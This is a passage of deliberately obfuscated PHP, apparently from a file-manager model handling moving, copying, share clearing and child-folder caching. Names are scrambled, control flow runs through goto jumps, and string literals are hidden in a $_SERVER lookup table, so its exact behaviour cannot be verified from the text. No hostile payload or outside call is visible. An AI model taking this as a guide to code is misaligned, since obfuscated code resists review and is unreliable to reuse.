$_SERVER[¬ˆÚÂ”Éğä]; $DÓÃë•ìš÷ = $this->sourceInfoCache($fŸëì×’§Á); $dÄ Ù±ˆ¾Š = $this->sourceInfoCache($Aå¨šÌº¬„); goto E„’‰ƒê ¾; eÅùö…ŞùÙ: if ($DÓÃë•ìš÷[$cÖâ¤‡½Şò[370]] != $cÖâ¤‡½Şò[83]) { $cÚµáœŠæİ[$cÖâ¤‡½Şò[503]][] = $DÓÃë•ìš÷[$cÖâ¤‡½Şò[419]]; return $aÌôëµ¡ˆ˜; } $Bæô¯ÏÚÅ = array(); $F¨ˆÇñóÊ§ = array(); goto f¹ï³İˆ—İ; B¶¢ƒ§äçí: $DÛ‚ªä²ë = $this->sourceInfo($aÌôëµ¡ˆ˜); foreach ($Bæô¯ÏÚÅ as $AÇƒ‚ù³¾¼) { $AÕÜŠÏ‹Š = $this->_makeItemData($AÇƒ‚ù³¾¼, $DÛ‚ªä²ë, $AÇƒ‚ù³¾¼[$cÖâ¤‡½Şò[28]]); $AÕÜŠÏ‹Š[$cÖâ¤‡½Şò[461]] = $AÇƒ‚ù³¾¼[$cÖâ¤‡½Şò[461]]; $F¨ˆÇñóÊ§[] = $AÕÜŠÏ‹Š; } $this->chunkEventSet($cÖâ¤‡½Şò[513], array($cÖâ¤‡½Şò[514], $D†ğĞ¶Íåö, $d›Óîõ„)); goto a¡Ã÷ÄË õ; B™šß—Íª·: $fàö·ñ¥àø[$fŸëì×’§Á] = $aÌôëµ¡ˆ˜; $d’¬Ö¾¥œó = array(); $Eˆê‡¯­šº = array(); goto f²³ÎÁçŸÖ; EÖèÙÄÌá: } private function _childrenMakeRelation($DºÖ»»Ññƒ, $b¾šçİÜ«) { $C‘¹‚ô¤á´ =& $_SERVER[¬ˆÚÂ”Éğä]; $bà›ô³‘Œ = array(); $CĞñ÷ËÀ‡ = array(); foreach ($DºÖ»»Ññƒ as $AĞ¶Æõ²ù½) { $a³å–«ÁåŠ = $AĞ¶Æõ²ù½[$C‘¹‚ô¤á´[28]] . $C‘¹‚ô¤á´[8] . $AĞ¶Æõ²ù½[$C‘¹‚ô¤á´[461]]; $bà›ô³‘Œ[$a³å–«ÁåŠ] = $AĞ¶Æõ²ù½[$C‘¹‚ô¤á´[369]]; } foreach ($b¾šçİÜ« as $AĞ¶Æõ²ù½) { $a³å–«ÁåŠ = $AĞ¶Æõ²ù½[$C‘¹‚ô¤á´[28]] . $C‘¹‚ô¤á´[8] . $AĞ¶Æõ²ù½[$C‘¹‚ô¤á´[461]]; $DÙÚ”™â = $bà›ô³‘Œ[$a³å–«ÁåŠ]; $CĞñ÷ËÀ‡[$DÙÚ”™â] = $AĞ¶Æõ²ù½[$C‘¹‚ô¤á´[369]]; } return $CĞñ÷ËÀ‡; } private function _childrenMatch($Aƒ„²ˆîÜâ, $D‡áåù¾², $bêËÂœíò) { goto E˜ËÊ»ã; d˜ãÛÓ¨Ï: $B…‚¶Âº—ª = $c³ä¦ŒÎï[count($c³ä¦ŒÎï) - 1]; return array($F¦óçØ‚Ô¡[463] => $B…‚¶Âº—ª, $F¦óçØ‚Ô¡[461] => $c»¢èŞ¯ÛÊ); goto Aåô›ÉÍ‘Ğ; DÊğ´“Ê: foreach ($DÀ„—ÏİØ† as $Bô•ØèÄ«É) { if (isset($Aƒ„²ˆîÜâ[$Bô•ØèÄ«É])) { $c»¢èŞ¯ÛÊ .= $Aƒ„²ˆîÜâ[$Bô•ØèÄ«É] . $F¦óçØ‚Ô¡[519]; } } $c»¢èŞ¯ÛÊ = rtrim($c»¢èŞ¯ÛÊ, $F¦óçØ‚Ô¡[47]) . $F¦óçØ‚Ô¡[47]; $c³ä¦ŒÎï = $this->parentLevelArray($c»¢èŞ¯ÛÊ); goto d˜ãÛÓ¨Ï; E˜ËÊ»ã: $F¦óçØ‚Ô¡ =& $_SERVER[¬ˆÚÂ”Éğä]; $c»¢èŞ¯ÛÊ = $bêËÂœíò[$F¦óçØ‚Ô¡[461]]; $DÀ„—ÏİØ† = $this->parentLevelArray($D‡áåù¾²[$F¦óçØ‚Ô¡[461]]); goto DÊğ´“Ê; Aåô›ÉÍ‘Ğ: } private function _makeItemData($E¿İí©‡æ, $f„Î…¥ˆá, $c‘ª’›ÏÉ¿) { $CÑ‰÷¯Ö‹ =& $_SERVER[¬ˆÚÂ”Éğä]; $D…éò¬çöù = array($CÑ‰÷¯Ö‹[520] => $E¿İí©‡æ[$CÑ‰÷¯Ö‹[370]], $CÑ‰÷¯Ö‹[386] => $c‘ª’›ÏÉ¿, $CÑ‰÷¯Ö‹[521] => $E¿İí©‡æ[$CÑ‰÷¯Ö‹[372]], $CÑ‰÷¯Ö‹[420] => $E¿İí©‡æ[$CÑ‰÷¯Ö‹[419]], $CÑ‰÷¯Ö‹[522] => $E¿İí©‡æ[$CÑ‰÷¯Ö‹[77]], $CÑ‰÷¯Ö‹[523] => $f„Î…¥ˆá[$CÑ‰÷¯Ö‹[371]], $CÑ‰÷¯Ö‹[524] => $f„Î…¥ˆá[$CÑ‰÷¯Ö‹[458]], $CÑ‰÷¯Ö‹[525] => USER_ID, $CÑ‰÷¯Ö‹[526] => USER_ID, $CÑ‰÷¯Ö‹[368] => $f„Î…¥ˆá[$CÑ‰÷¯Ö‹[369]], $CÑ‰÷¯Ö‹[527] => $f„Î…¥ˆá[$CÑ‰÷¯Ö‹[461]] . $f„Î…¥ˆá[$CÑ‰÷¯Ö‹[369]] . $CÑ‰÷¯Ö‹[47], $CÑ‰÷¯Ö‹[396] => 0, $CÑ‰÷¯Ö‹[528] => $CÑ‰÷¯Ö‹[33]); return $D…éò¬çöù; } private function _copyApplyMeta($b˜Æ­´ÂÆ•, &$A¢ì˜Ñ’) { $b‰…®‚Íë® =& $_SERVER[¬ˆÚÂ”Éğä]; $eÒ¸áŸÓÎ… = $b˜Æ­´ÂÆ•[$b‰…®‚Íë®[369]]; $c£ó¼¹Ğ™ = $b˜Æ­´ÂÆ•[$b‰…®‚Íë®[28]]; if (!isset($b˜Æ­´ÂÆ•[$b‰…®‚Íë®[529]]) || !$b˜Æ­´ÂÆ•[$b‰…®‚Íë®[529]] || $b˜Æ­´ÂÆ•[$b‰…®‚Íë®[529]] == $b‰…®‚Íë®[470]) { $A¢ì˜Ñ’[$b‰…®‚Íë®[505]][] = array($b‰…®‚Íë®[369], $eÒ¸áŸÓÎ…, $b‰…®‚Íë®[529], short_id($eÒ¸áŸÓÎ…)); } if (Input::check($c£ó¼¹Ğ™, $b‰…®‚Íë®[530])) { $A¢ì˜Ñ’[$b‰…®‚Íë®[504]][] = array($b‰…®‚Íë®[369] => $eÒ¸áŸÓÎ…, $b‰…®‚Íë®[89] => $b‰…®‚Íë®[416], $b‰…®‚Íë®[359] => str_replace($b‰…®‚Íë®[50], $b‰…®‚Íë®[33], Pinyin::encode($c£ó¼¹Ğ™))); $A¢ì˜Ñ’[$b‰…®‚Íë®[504]][] = array($b‰…®‚Íë®[369] => $eÒ¸áŸÓÎ…, $b‰…®‚Íë®[89] => $b‰…®‚Íë®[415], $b‰…®‚Íë®[359] => Pinyin::encode($c£ó¼¹Ğ™, $b‰…®‚Íë®[531])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($d£ŠÇ”°Ò) { goto C©Àîç”¹™; d‘†¤İ‘Å: $Eô–÷ÔË± = array($E–¼™¶‡÷ª[461] => array($E–¼™¶‡÷ª[485], $bæ–‰Ñğãò[$E–¼™¶‡÷ª[461]] . $d£ŠÇ”°Ò . $E–¼™¶‡÷ª[486]), $E–¼™¶‡÷ª[397] => $this->targetIsDelete); $BíãÛå¯½† = $this->field($aŞ¾à£õÄ™)->where($Eô–÷ÔË±)->select(); if (!$BíãÛå¯½†) { return; } goto AøÙ‹Ÿõ; AøÙ‹Ÿõ: $BíãÛå¯½† = array_to_keyvalue($BíãÛå¯½†, $E–¼™¶‡÷ª[369]); foreach ($BíãÛå¯½† as $aÑ‘×Îìš‚) { $A×—Õ½ĞÆ = $aÑ‘×Îìš‚[$E–¼™¶‡÷ª[463]]; $d£ŠÇ”°Ò = $aÑ‘×Îìš‚[$E–¼™¶‡÷ª[369]]; if (!isset($this->_childrenListCache[$d£ŠÇ”°Ò]) && $aÑ‘×Îìš‚[$E–¼™¶‡÷ª[370]] == $E–¼™¶‡÷ª[83]) { $this->_childrenListCache[$d£ŠÇ”°Ò] = array(); } if (!isset($this->_childrenListCache[$A×—Õ½ĞÆ])) { $this->_childrenListCache[$A×—Õ½ĞÆ] = array(); } $this->_childrenListCache[$A×—Õ½ĞÆ][$d£ŠÇ”°Ò] = $aÑ‘×Îìš‚; $this->_childrenItemCache[$d£ŠÇ”°Ò] = $aÑ‘×Îìš‚; } goto e•Ä„ÒÅ; C©Àîç”¹™: $E–¼™¶‡÷ª =& $_SERVER[¬ˆÚÂ”Éğä]; $bæ–‰Ñğãò = $this->sourceInfo($d£ŠÇ”°Ò); $aŞ¾à£õÄ™ = $E–¼™¶‡÷ª[532]; goto d‘†¤İ‘Å; e•Ä„ÒÅ: } private function _childrenListAll($DÏÙŠ·†à˜, &$d‹§˜Š¥Ì¾) { $B¶öäÛ‘Û =& $_SERVER[¬ˆÚÂ”Éğä]; if (!isset($this->_childrenListCache[$DÏÙŠ·†à˜])) { return; } $a”ÖŒèõ˜ = $this->_childrenListCache[$DÏÙŠ·†à˜]; foreach ($a”ÖŒèõ˜ as $C¬òš‰©× => $bèÑ¤ÛŸŸ) { $d‹§˜Š¥Ì¾[$C¬òš‰©×] = $bèÑ¤ÛŸŸ; if ($bèÑ¤ÛŸŸ[$B¶öäÛ‘Û[370]] == $B¶öäÛ‘Û[83]) { $this->_childrenListAll($C¬òš‰©×, $d‹§˜Š¥Ì¾); } } } private function sourceInfoCache($a®ËÅ¤‡×ê) { if (isset($this->_childrenItemCache[$a®ËÅ¤‡×ê])) { return $this->_childrenItemCache[$a®ËÅ¤‡×ê]; } return $this->sourceInfo($a®ËÅ¤‡×ê); } private function _childrenList($Fƒ˜¸ä­Éâ) { if (isset($this->_childrenListCache[$Fƒ˜¸ä­Éâ])) { return $this->_childrenListCache[$Fƒ˜¸ä­Éâ]; } return $this->_childrenListSelect($Fƒ˜¸ä­Éâ); } private function _childrenListSelect($f‡Ëæ¶Ü™ï) { goto d²›Ä×ÔË; F‰Äñ¼ŒÓ: $dİ‘¹ä„ñÅ = $dİ‘¹ä„ñÅ ? $dİ‘¹ä„ñÅ : array(); $E‹ˆšµÍŒĞ = array_to_keyvalue($dİ‘¹ä„ñÅ, $F›¯ï§¯‡¾[369]); $this->_childrenListCache[$f‡Ëæ¶Ü™ï] = $E‹ˆšµÍŒĞ; goto b¥Ç²¬¾¨‚; b¥Ç²¬¾¨‚: foreach ($E‹ˆšµÍŒĞ as $f‡Ëæ¶Ü™ï => $a…‚ÔÇòè™) { $this->_childrenItemCache[$f‡Ëæ¶Ü™ï] = $a…‚ÔÇòè™; } return $E‹ˆšµÍŒĞ; goto B¤¶ÛµÉº; d²›Ä×ÔË: $F›¯ï§¯‡¾ =& $_SERVER[¬ˆÚÂ”Éğä]; $aƒ‘•¦Å = array($F›¯ï§¯‡¾[463] => $f‡Ëæ¶Ü™ï, $F›¯ï§¯‡¾[397] => $this->targetIsDelete); $dİ‘¹ä„ñÅ = $this->where($aƒ‘•¦Å)->select(); goto F‰Äñ¼ŒÓ; B¤¶ÛµÉº: } private function fileNameExistCache($bˆ¥ŠÜ¶Ÿà, $C¯İËŞ”¦Ü) { $A‘ë¸ÂŠÄÈ =& $_SERVER[¬ˆÚÂ”Éğä]; $C¯İËŞ”¦Ü = strtolower($C¯İËŞ”¦Ü); $Aâ—¢àÓ = $this->_childrenList($bˆ¥ŠÜ¶Ÿà); foreach ($Aâ—¢àÓ as $DÆç§Ë÷®Û) { if ($C¯İËŞ”¦Ü == strtolower($DÆç§Ë÷®Û[$A‘ë¸ÂŠÄÈ[28]])) { return $DÆç§Ë÷®Û[$A‘ë¸ÂŠÄÈ[369]]; } } return !1; } private function fileNameAutoCache($CËÕìÃ‡, $bÛ¯Ôãƒì, $d»“Áä£Ó÷, $fïìœÓºÊ‘) { $f”™¥Ï™‰ =& $_SERVER[¬ˆÚÂ”Éğä]; $bØ×îŒ­Œ = $this->_childrenList($CËÕìÃ‡); $Cô¼Ó‰¨³± = array_to_keyvalue($bØ×îŒ­Œ, $f”™¥Ï™‰[33], $f”™¥Ï™‰[28]); return $this->fileNameAutoGet($Cô¼Ó‰¨³±, $bÛ¯Ôãƒì, $d»“Áä£Ó÷, $fïìœÓºÊ‘); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($f¤ø¬íì®½, $eÕŒÉ¢ë¹, $D¢Û»’Ö¤œ = REPEAT_REPLACE, $Dâ£ÜĞ¾İ = '') { goto a ÎŒšÆ; aÍ÷¡Ï³İ†: if ($cé”ßò£ÂÅ[$Aøº¹…±¨ò[463]] == $CİÓ¿ƒÇÍ–[$Aøº¹…±¨ò[369]]) { if ($cé”ßò£ÂÅ[$Aøº¹…±¨ò[397]] == $Aøº¹…±¨ò[83]) { Model($Aøº¹…±¨ò[395])->restore(array($f¤ø¬íì®½)); } return $f¤ø¬íì®½; } $dËºƒäÚÃ = $this->pathInfoMore($f¤ø¬íì®½); if ($this->isParentOf($f¤ø¬íì®½, $eÕŒÉ¢ë¹)) { return !1; } goto a÷³÷·×ˆ–; Có·«ãŒ®«: if ($cé”ßò£ÂÅ[$Aøº¹…±¨ò[463]] == $eÕŒÉ¢ë¹ && $Dâ£ÜĞ¾İ != $cé”ßò£ÂÅ[$Aøº¹…±¨ò[28]]) { $FÏÛÚŸÕ’é = $this->fileNameExist($eÕŒÉ¢ë¹, $Dâ£ÜĞ¾İ); if ($FÏÛÚŸÕ’é && $cé”ßò£ÂÅ[$Aøº¹…±¨ò[370]] == $Aøº¹…±¨ò[470]) { goto eôò°ª¥ë; eôò°ª¥ë: $fƒ£‚’‰êÅ = $this->sourceInfo($FÏÛÚŸÕ’é); $a¤ÓôÈãÒ§ = $this->fileHistory($fƒ£‚’‰êÅ, $cé”ßò£ÂÅ[$Aøº¹…±¨ò[419]], $cé”ßò£ÂÅ[$Aøº¹…±¨ò[77]]); if (!$a¤ÓôÈãÒ§) { Model($Aøº¹…±¨ò[422])->remove($cé”ßò£ÂÅ[$Aøº¹…±¨ò[419]]); } goto cå†æ¯´ñ‚; EªŠáÛåÙ: return $FÏÛÚŸÕ’é; goto EƒóªÉ¡±Ã; cå†æ¯´ñ‚: $this->removeNow($f¤ø¬íì®½, !1); $this->folderSizeReset($eÕŒÉ¢ë¹); Hook::trigger($Aøº¹…±¨ò[534], $dËºƒäÚÃ); goto EªŠáÛåÙ; EƒóªÉ¡±Ã: } } $d®ŒºßÔÔ = $Dâ£ÜĞ¾İ ? $Dâ£ÜĞ¾İ : $cé”ßò£ÂÅ[$Aøº¹…±¨ò[28]]; $this->lockMoveStart($f¤ø¬íì®½); goto B›˜æ“ğ›£; a÷³÷·×ˆ–: if (!$cé”ßò£ÂÅ || !$CİÓ¿ƒÇÍ– || $CİÓ¿ƒÇÍ–[$Aøº¹…±¨ò[370]] != $Aøº¹…±¨ò[83]) { return !1; } Hook::trigger($Aøº¹…±¨ò[533], $dËºƒäÚÃ); $this->targetIsDelete = intval($cé”ßò£ÂÅ[$Aøº¹…±¨ò[397]]); goto Có·«ãŒ®«; dôÉ­ÕÉƒ: $this->updateModifyTime($EÑõÏ¼‚¤£); Model($Aøº¹…±¨ò[507])->eventMove($f¤ø¬íì®½, $cé”ßò£ÂÅ[$Aøº¹…±¨ò[463]], $eÕŒÉ¢ë¹); Hook::trigger($Aøº¹…±¨ò[534], $dËºƒäÚÃ); goto F°æ¶‹„À®; F°æ¶‹„À®: return $A¡çøÖÌàÍ; goto BŞÚ­ÆÙˆŞ; d’¶ÑœÉ°: if ($cé”ßò£ÂÅ[$Aøº¹…±¨ò[370]] == $Aøº¹…±¨ò[83] && $EàËëÙ±ğ) { $this->folderSizeResetChildren($A¡çøÖÌàÍ); } Model($Aøº¹…±¨ò[167])->linkAdd($Dò£ÂĞï¯™[$Aøº¹…±¨ò[503]]); if ($EàËëÙ±ğ && $Dò£ÂĞï¯™[$Aøº¹…±¨ò[535]]) { $this->removeNow($f¤ø¬íì®½, !1); } goto Bá„÷åï‚ä; Bá„÷åï‚ä: $this->lockMoveEnd($f¤ø¬íì®½); $this->lockWriteEnd($eÕŒÉ¢ë¹, $d®ŒºßÔÔ); $this->folderSizeReset($cé”ßò£ÂÅ[$Aøº¹…±¨ò[463]]); goto F¢¥‰‘””; d×ÉØ¾ôĞÂ: $EàËëÙ±ğ = $this->fileNameExistCache($eÕŒÉ¢ë¹, $cé”ßò£ÂÅ[$Aøº¹…±¨ò[28]]); $A¡çøÖÌàÍ = $this->_move($f¤ø¬íì®½, $eÕŒÉ¢ë¹, $D¢Û»’Ö¤œ, $Dò£ÂĞï¯™, $Dâ£ÜĞ¾İ); $this->sourceCacheClear(); goto d’¶ÑœÉ°; B›˜æ“ğ›£: $this->lockWriteStart($eÕŒÉ¢ë¹, $d®ŒºßÔÔ); $Dò£ÂĞï¯™ = array($Aøº¹…±¨ò[503] => array(), $Aøº¹…±¨ò[535] => !1); $this->clearShare($f¤ø¬íì®½, $eÕŒÉ¢ë¹); goto d×ÉØ¾ôĞÂ; a ÎŒšÆ: $Aøº¹…±¨ò =& $_SERVER[¬ˆÚÂ”Éğä]; $cé”ßò£ÂÅ = $this->sourceInfo($f¤ø¬íì®½); $CİÓ¿ƒÇÍ– = $this->sourceInfo($eÕŒÉ¢ë¹); goto aÍ÷¡Ï³İ†; F¢¥‰‘””: $this->folderSizeReset($eÕŒÉ¢ë¹); $EÑõÏ¼‚¤£ = array($cé”ßò£ÂÅ[$Aøº¹…±¨ò[463]], $eÕŒÉ¢ë¹); if ($cé”ßò£ÂÅ[$Aøº¹…±¨ò[370]] == $Aøº¹…±¨ò[83]) { $EÑõÏ¼‚¤£[] = $f¤ø¬íì®½; } goto dôÉ­ÕÉƒ; BŞÚ­ÆÙˆŞ: } private function _move($bñÅĞ¿«²§, $e¤“ˆ³Èº, $F”îÊïãå¬, &$dÖ®×õÁÅÊ, $E“Û­¸÷ = '') { goto c¯ˆĞ±äÕ; d³áŸ‡ºƒŞ: return $A²íèÚ½‹; goto DÊ×ÇÀóİÃ; c¯ˆĞ±äÕ: $cÁ½ÆœŠ¥ =& $_SERVER[¬ˆÚÂ”Éğä]; $f‹ƒµÁó©® = $this->sourceInfo($bñÅĞ¿«²§); $E œ—‘âç® = $f‹ƒµÁó©®[$cÁ½ÆœŠ¥[370]] == $cÁ½ÆœŠ¥[83]; goto b””ê‘Œæ„; C‹º’µ«Ñ•: $e»Ÿ‡­Ú‚è = !1; if ($E œ—‘âç®) { if ($F”îÊïãå¬ == REPEAT_RENAME_FOLDER) { $A¸Ôµëì°· = $this->fileNameAuto($e¤“ˆ³Èº, $A¸Ôµëì°·, $F”îÊïãå¬, $E œ—‘âç®); $A²íèÚ½‹ = $this->_moveForce($bñÅĞ¿«²§, $e¤“ˆ³Èº, $A¸Ôµëì°·); } else { if ($F”îÊïãå¬ == REPEAT_RENAME_FOLDER) { $F”îÊïãå¬ = REPEAT_RENAME; } $DŒÇ•Û‰ö = $this->_childrenListSelect($bñÅĞ¿«²§); foreach ($DŒÇ•Û‰ö as $d¯»İ˜©£—) { $this->_move($d¯»İ˜©£—[$cÁ½ÆœŠ¥[369]], $D¾‚ºİÔøÎ, $F”îÊïãå¬, $dÖ®×õÁÅÊ); } $e»Ÿ‡­Ú‚è = !0; } } else { if ($F”îÊïãå¬ == REPEAT_SKIP) { $e»Ÿ‡­Ú‚è = !0; } else { if ($F”îÊïãå¬ == REPEAT_RENAME || $F”îÊïãå¬ == REPEAT_RENAME_FOLDER) { $A¸Ôµëì°· = $this->fileNameAuto($e¤“ˆ³Èº, $A¸Ôµëì°·, $F”îÊïãå¬, $E œ—‘âç®); $A²íèÚ½‹ = $this->_moveForce($bñÅĞ¿«²§, $e¤“ˆ³Èº, $A¸Ôµëì°·); } else { if ($F”îÊïãå¬ == REPEAT_REPLACE) { $f×•™¯ê = $this->sourceInfoCache($D¾‚ºİÔøÎ); $dÉ™…„¨Šó = $this->fileHistory($f×•™¯ê, $f‹ƒµÁó©®[$cÁ½ÆœŠ¥[419]], $f‹ƒµÁó©®[$cÁ½ÆœŠ¥[77]]); if ($dÉ™…„¨Šó) { $dÖ®×õÁÅÊ[$cÁ½ÆœŠ¥[503]][] = $f‹ƒµÁó©®[$cÁ½ÆœŠ¥[419]]; } else { $e»Ÿ‡­Ú‚è = !0; } } } } } if ($e»Ÿ‡­Ú‚è && !$dÖ®×õÁÅÊ[$cÁ½ÆœŠ¥[535]]) { $dÖ®×õÁÅÊ[$cÁ½ÆœŠ¥[535]] = !0; } goto d³áŸ‡ºƒŞ; b””ê‘Œæ„: $A¸Ôµëì°· = $E“Û­¸÷ ? $E“Û­¸÷ : $f‹ƒµÁó©®[$cÁ½ÆœŠ¥[28]]; $D¾‚ºİÔøÎ = $this->fileNameExistCache($e¤“ˆ³Èº, $A¸Ôµëì°·); $this->lockMoveStart($bñÅĞ¿«²§); goto E™×­Ù­ğ¹; E™×­Ù­ğ¹: $this->lockWriteStart($e¤“ˆ³Èº, $A¸Ôµëì°·); if (!$D¾‚ºİÔøÎ) { return $this->_moveForce($bñÅĞ¿«²§, $e¤“ˆ³Èº, $A¸Ôµëì°·); } $A²íèÚ½‹ = $D¾‚ºİÔøÎ; goto C‹º’µ«Ñ•; DÊ×ÇÀóİÃ: } private function _moveForce($e¥ğä¸²¤, $b¼¬œ…ğÖò, $BÊŞÁ±ìèÖ) { goto A¥·“¡; Bˆî¶ìÃ¾Œ: $D‘‚ç¡ÀŒ = $fÀ…ª…¿ÒŒ[$d¶‘‰šŒéë[370]] == $d¶‘‰šŒéë[83]; $A´óÍØÇêÕ = array($d¶‘‰šŒéë[368] => $aê®¾ßµÅŒ[$d¶‘‰šŒéë[369]], $d¶‘‰šŒéë[527] => $aê®¾ßµÅŒ[$d¶‘‰šŒéë[461]] . $aê®¾ßµÅŒ[$d¶‘‰šŒéë[369]] . $d¶‘‰šŒéë[47], $d¶‘‰šŒéë[523] => $aê®¾ßµÅŒ[$d¶‘‰šŒéë[371]], $d¶‘‰šŒéë[524] => $aê®¾ßµÅŒ[$d¶‘‰šŒéë[458]], $d¶‘‰šŒéë[526] => USER_ID, $d¶‘‰šŒéë[386] => $BÊŞÁ±ìèÖ); $EÊĞ³èÏáÜ = $fÀ…ª…¿ÒŒ[$d¶‘‰šŒéë[371]] == SourceModel::TYPE_GROUP && $aê®¾ßµÅŒ[$d¶‘‰šŒéë[371]] == SourceModel::TYPE_GROUP && $fÀ…ª…¿ÒŒ[$d¶‘‰šŒéë[458]] == $aê®¾ßµÅŒ[$d¶‘‰šŒéë[458]]; goto D¤ÑÚŸ”­; D¹ïº°Ùõ‡: if ($D‘‚ç¡ÀŒ) { $C†×ÄËÜ¬¤ = array($d¶‘‰šŒéë[527] => array($d¶‘‰šŒéë[485], $fÀ…ª…¿ÒŒ[$d¶‘‰šŒéë[461]] . $fÀ…ª…¿ÒŒ[$d¶‘‰šŒéë[369]] . $d¶‘‰šŒéë[486])); $CÍƒƒ„° = $fÀ…ª…¿ÒŒ[$d¶‘‰šŒéë[461]] . $fÀ…ª…¿ÒŒ[$d¶‘‰šŒéë[369]] . $d¶‘‰šŒéë[47]; $AŞƒŒŒ”É = $aê®¾ßµÅŒ[$d¶‘‰šŒéë[461]] . $aê®¾ßµÅŒ[$d¶‘‰šŒéë[369]] . $d¶‘‰šŒéë[47] . $fÀ…ª…¿ÒŒ[$d¶‘‰šŒéë[369]] . $d¶‘‰šŒéë[47]; $AÛ‡¸öÆ¼“ = array($d¶‘‰šŒéë[527] => array($d¶‘‰šŒéë[536], "\x72\x65\160\x6c\141\143\145\x28\160\x61\162\x65\156\x74\x4c\x65\x76\x65\154\x2c\x27{$CÍƒƒ„°}\47\x2c\47{$AŞƒŒŒ”É}\47\51"), $d¶‘‰šŒéë[523] => $aê®¾ßµÅŒ[$d¶‘‰šŒéë[371]], $d¶‘‰šŒéë[524] => $aê®¾ßµÅŒ[$d¶‘‰šŒéë[458]]); if ($d™ÍÔß) { $AÛ‡¸öÆ¼“[$d¶‘‰šŒéë[396]] = 0; } $this->where($C†×ÄËÜ¬¤)->data($AÛ‡¸öÆ¼“)->save(); } $this->where(array($d¶‘‰šŒéë[383] => $e¥ğä¸²¤))->data($A´óÍØÇêÕ)->save(); return $e¥ğä¸²¤; goto AËŠâÓÅæ; D¤ÑÚŸ”­: if (!$EÊĞ³èÏáÜ) { Model($d¶‘‰šŒéë[456])->authClear($e¥ğä¸²¤); } $d™ÍÔß = $fÀ…ª…¿ÒŒ[$d¶‘‰šŒéë[397]] == $d¶‘‰šŒéë[83] && $aê®¾ßµÅŒ[$d¶‘‰šŒéë[397]] != $d¶‘‰šŒéë[83]; if ($d™ÍÔß) { $A´óÍØÇêÕ[$d¶‘‰šŒéë[396]] = 0; } goto D¹ïº°Ùõ‡; A¥·“¡: $d¶‘‰šŒéë =& $_SERVER[¬ˆÚÂ”Éğä]; $fÀ…ª…¿ÒŒ = $this->sourceInfo($e¥ğä¸²¤); $aê®¾ßµÅŒ = $this->sourceInfo($b¼¬œ…ğÖò); goto Bˆî¶ìÃ¾Œ; AËŠâÓÅæ: } private function clearShare($c…ˆ›Ê¶¦™, $eà¢¿ù’â†) { goto AŠà†µìŒ‡; dÍİ±ĞÏÑó: if ($AÙİĞÍ¹ƒ[$bášëòªìî[458]] == $FÅŠÑ»ÉÑÄ[$bášëòªìî[458]] && $AÙİĞÍ¹ƒ[$bášëòªìî[371]] == $bášëòªìî[537]) { return; } $Bê¯“——İ = array($bášëòªìî[461] => array($bášëòªìî[485], $AÙİĞÍ¹ƒ[$bášëòªìî[461]] . $c…ˆ›Ê¶¦™ . $bášëòªìî[486])); $aµŠ¬ï™„¦ = $this->field($bášëòªìî[383])->where($Bê¯“——İ)->getField($bášëòªìî[369], !0); goto cå¥ÙÈ„²±; cå¥ÙÈ„²±: if (!$aµŠ¬ï™„¦) { return; } $Bê¯“——İ = array($bášëòªìî[369] => array($bášëòªìî[7], $aµŠ¬ï™„¦), $bášëòªìî[448] => 1); $Bİ¿â¹Öîá = Model($bášëòªìî[538])->field($bášëòªìî[441])->where($Bê¯“——İ)->select(); goto Aäƒ°‹Åò¿; Aäƒ°‹Åò¿: if (!$Bİ¿â¹Öîá) { return; } $Bİ¿â¹Öîá = array_to_keyvalue($Bİ¿â¹Öîá, $bášëòªìî[33], $bášëòªìî[441]); $Bê¯“——İ = array($bášëòªìî[441] => array($bášëòªìî[7], $Bİ¿â¹Öîá)); goto F²ÑÂ¶õÃ®; AŠà†µìŒ‡: $bášëòªìî =& $_SERVER[¬ˆÚÂ”Éğä]; $AÙİĞÍ¹ƒ = $this->sourceInfo($c…ˆ›Ê¶¦™); $FÅŠÑ»ÉÑÄ = $this->sourceInfo($eà¢¿ù’â†); goto dÍİ±ĞÏÑó; F²ÑÂ¶õÃ®: Model($bášëòªìî[538])->where($Bê¯“——İ)->save(array($bášëòªìî[448] => 0)); Model($bášëòªìî[539])->where($Bê¯“——İ)->delete(); goto CØøÛ…‚ïÙ; CØøÛ…‚ïÙ: } public function copyFolderFromIO($a‚Î¾“‡½, $cÖ³‹«ŠöÎ, $bØÃ‡ˆÌ˜Š, $d·Ìè©óí, $DÔŠ±’º‰, $b¬¤²Ò™‹ = false) { goto D¯Áè­ÖƒŞ; CîÀ­™˜ˆ­: $Aéò•¡³Óº = $this->fileNameExist($bØÃ‡ˆÌ˜Š, $aùËØ›Âºã); $cî·ØÇ²µ¾ = $this->mkdir($bØÃ‡ˆÌ˜Š, $aùËØ›Âºã, $d·Ìè©óí); if (!$Aéò•¡³Óº || $d·Ìè©óí == REPEAT_RENAME_FOLDER) { $d·Ìè©óí = !1; } goto cåÔ§­ºÂé; cåÔ§­ºÂé: if ($Aéò•¡³Óº) { $this->_childrenAllMake($Aéò•¡³Óº); } Hook::trigger($f›ğ›ĞÛ²Û[541]); $this->_copyChildTo($a‚Î¾“‡½, $cÖ³‹«ŠöÎ, $cî·ØÇ²µ¾, $d·Ìè©óí, $C†èà»Ğ¶š, $DÔŠ±’º‰); goto C‚ªâÒõğ…; C‚ªâÒõğ…: Hook::trigger($f›ğ›ĞÛ²Û[542]); if ($cî·ØÇ²µ¾) { $this->folderSizeResetChildren($cî·ØÇ²µ¾); } $this->_childrenListClear(); goto c´¡ÖÉŠ«É; E…Š¦ÉË: Model($f›ğ›ĞÛ²Û[422])->linkAdd($C†èà»Ğ¶š[$f›ğ›ĞÛ²Û[503]]); Model($f›ğ›ĞÛ²Û[422])->remove($C†èà»Ğ¶š[$f›ğ›ĞÛ²Û[540]]); $this->folderSizeReset($bØÃ‡ˆÌ˜Š); goto EİŒõÔ×ƒ°; D¯Áè­ÖƒŞ: $f›ğ›ĞÛ²Û =& $_SERVER[¬ˆÚÂ”Éğä]; $C†èà»Ğ¶š = array($f›ğ›ĞÛ²Û[504] => array(), $f›ğ›ĞÛ²Û[505] => array(), $f›ğ›ĞÛ²Û[503] => array(), $f›ğ›ĞÛ²Û[540] => array()); $aùËØ›Âºã = $b¬¤²Ò™‹ ? $b¬¤²Ò™‹ : $a‚Î¾“‡½->getPathName($a‚Î¾“‡½->pathThis($cÖ³‹«ŠöÎ)); goto CîÀ­™˜ˆ­; c´¡ÖÉŠ«É: 